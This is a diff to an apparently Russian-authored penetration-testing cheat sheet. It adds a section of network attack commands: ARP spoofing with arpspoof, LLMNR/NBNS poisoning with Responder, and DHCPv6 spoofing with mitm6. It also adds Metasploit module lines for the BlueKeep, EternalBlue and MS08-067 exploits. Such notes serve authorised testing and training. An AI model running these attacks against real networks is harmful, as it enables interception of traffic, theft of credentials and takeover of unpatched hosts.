@@ -1522,10 +1522,10 @@ root@kali:$ mkdir -p discovery/{subnets,hosts,services/names} exploitation/ file
 ## Network Status
 
 ```
-ip addr (ifconfig)
-iproute (route -n)
-cat /etc/resolve.conf
-arp -a
+root@kali:$ ip addr (ifconfig)
+root@kali:$ ip route (route -n)
+root@kali:$ cat /etc/resolve.conf
+root@kali:$ arp -a
 ```
 
 
@@ -1551,10 +1551,37 @@ root@kali:$ sed -i subnets/ranges.txt -e 's/$/\/24/'
 Passive traffic analyze. Look for broadcast/multicast, IPv6 packets:
 
 * ARP
-* LLMNR, NBNS -- `Responder.py`
+* LLMNR, NBNS
 * STP
-* DHCP, DHCPv6 -- `mitm6.py`
+* DHCPv6, ICMPv6
 * mDNS
+
+
+#### Network attacks
+
+##### ARP Spoofing
+
+```
+root@kali:$ arpspoof -c both -t ЖЕРТВА_10.0.0.5 ШЛЮЗ_10.0.0.1
+```
+
+* [www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/](https://www.blackhillsinfosec.com/analyzing-arp-to-discover-exploit-stale-network-address-configurations/)
+
+##### LLMNR/NBNS Poisoning
+
+```
+root@kali:$ responder -w -F -vvv -I <eth#>
+```
+
+* [www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
+
+##### DHCPv6
+
+```
+root@kali:$ ./mitm6.py -i <eth#>
+```
+
+* [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
 
 
 
@@ -1699,6 +1726,37 @@ Split version scan by service names:
 
 ```
 root@kali:$ parsenmap.py -i services/alltcp-versions.xml
+```
+
+
+
+### LHF Exploits
+
+
+#### BlueKeep
+
+CVE-2019-0708.
+
+```
+msf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+```
+
+
+#### EternalBlue
+
+CVE-2017-0144, MS17-010.
+
+```
+msf5 > use auxiliary/scanner/smb/smb_ms17_010
+```
+
+
+#### net_api
+
+CVE-2008-4250, MS08-067.
+
+```
+msf5 > use exploit/windows/smb/ms08_067_netapi
 ```
 
 
